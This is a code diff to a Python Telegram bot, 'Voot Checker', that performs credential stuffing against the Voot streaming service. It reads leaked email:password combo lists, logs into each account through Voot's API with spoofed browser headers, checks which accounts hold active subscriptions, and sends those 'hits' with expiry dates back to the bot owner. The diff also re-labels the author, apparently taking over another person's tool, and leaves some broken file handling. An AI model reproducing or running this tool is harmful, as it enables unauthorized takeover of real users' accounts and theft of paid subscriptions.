@@ -1,5 +1,6 @@
 #Name: Voot Checker
-#Author: Mayvid
+#Author: Zero
+
 
 try:
     import pyfiglet
@@ -42,9 +43,8 @@ except:
     tyer.write(api_id + '\n' + api_hash + '\n' + bot_token + '\n' + str(owner))
     tyer.close()
 
-print(pyfiglet.figlet_format("R X S"))
-print('\nVoot checker bot by Mayvid.')
-
+print(pyfiglet.figlet_format("ZERO"))
+print('\nVoot checker bot by Zero.')
 
 client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 @client.on(events.NewMessage)
@@ -52,15 +52,10 @@ async def my_event_handler(event):
     if event.peer_id.user_id == owner and event.raw_text == '/check':
         await event.download_media("./"+'database.txt')
         data_holder = dict()
+
         def reset():
             writer = open('hits.txt', 'w')
-            writer.write('')
-            writer.close()
-            writer = open('failure.txt', 'w')
-            writer.write('')
-            writer.close()
-            writer = open('checked.txt', 'w')
-            writer.write('')
+            writer.write()
             writer.close()
 
         def database(): # getting email and password from combo file
@@ -71,17 +66,12 @@ async def my_event_handler(event):
                     opener.close()
                     break                                      
                 email = reader[0:reader.find(':')]
-                password = reader[reader.find(':')+1:]
+                password = reader[reader.find(':')+1:-1]
                 data_holder[email] = password
 
         def hits(hit): # saving the hits.
-            writer = open('voot_hits.txt', 'a')
+            writer = open('hits.txt', 'a')
             writer.write(hit)
-            writer.close()
-
-        def failure(fail): # saving the failures
-            writer = open('voot_failures.txt', 'a')
-            writer.write(fail)
             writer.close()
 
         database()
@@ -108,40 +98,44 @@ async def my_event_handler(event):
                 'sec-fetch-site': 'same-site',
                 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71',
                 }
-            post_data = {'data': {'email': str(list(data_holder.keys())[count]), 'password': str(list(data_holder.values())[count])}, 'type': "traditional", 'deviceId': "Windows NT 6.3", 'deviceBrand': "PC/MAC"}
+            post_data = {'type': "traditional", 'deviceId': "Windows NT 6.3", 'deviceBrand': "PC/MAC", 'data': {'email': str(list(data_holder.keys())[count]), 'password': str(list(data_holder.values())[count])}}
             posts = requests.post(url=url, headers=header, json=post_data)
-            checkers = json.loads(posts.text)
-            checkers = dict(checkers)
-
-            try:
-                if checkers['status']['message']:
-                    failure(str(list(data_holder.keys())[count]) + ':' + str(list(data_holder.values())[count]) + '\nResponse --> '+ 'Wrong combination of user and password.')
-            except:
-                print(checkers)
-                access = checkers['data']['authToken']['accessToken']
-                url = 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status'
-                header = {
-                    'Accept': 'application/json, text/plain, */*',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'accesstoken': str(access),
-                    'Origin': 'https://www.voot.com',
-                    'Referer': 'https://www.voot.com/',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71',
-                }                
-                posts = requests.get(url=url, headers=header)
-                jsoner = json.loads(posts.text)
-                jsoner = dict(jsoner)
-                print(jsoner)
-                if jsoner['status'] == 'active':
-                    expiry = jsoner['activeTillDate']['gmtDate']
-                    expiry = expiry[0:expiry.find('2021')+4]
-                    hits(str(list(data_holder.keys())[count]) + ':' + str(list(data_holder.values())[count] + 'Expiry date --> ' + str(expiry))+'\n')
-                else:
-                    failure(str(list(data_holder.keys())[count]) + ':' + str(list(data_holder.values())[count]) + '\nResponse --> '+ checkers['status']['message']+'/n')
+            status = int(posts.status_code)
+            if status == 200:
+                try:
+                    checker = json.loads(posts.text)
+                    access_token = str(checker['data']['authToken']['accessToken'])
+                    url = 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status'
+                    header = {
+                        'accesstoken': access_token,
+                        'Accept': 'application/json, text/plain, */*',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'origin': 'https://www.voot.com',
+                        'referer': 'https://www.voot.com/',
+                        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
+                    }
+                    requs = requests.get(url, headers=header)
+                    checker = json.loads(requs.text)
+                    status = checker['status']
+                    if status == "active":
+                        expiry = str(checker['activeTillDate']['gmtDate'])
+                        expiry = expiry[:expiry.find(':')-3]
+                        hitter = str(list(data_holder.keys())[count]) + str(list(data_holder.values())[count]) + '  ||  Expiry --> ' + expiry + '\n'
+                        print(hitter)
+                        hits(hitter)
+                except:
+                    pass
             count = count+1
+        try:
+            await client.send_file(event.peer_id.user_id, 'voot_hits.txt', caption='Checker by @zero_checkers. \nVoot Checker.')
+        except:
+            await client.send_message(event.peer_id.user_id, 'Got 0 Hits.')
+        reset()
 
-        await client.send_file(event.peer_id.user_id, 'voot_hits.txt', caption='Checker by @mayvidxd. \nVoot Checker.')
-        await client.send_file(event.peer_id.user_id, 'voot_failures.txt', caption='Checker by @mayvidxd. \nVoot Checker.')
-        
+
+
 client.run_until_disconnected()
+
+
+
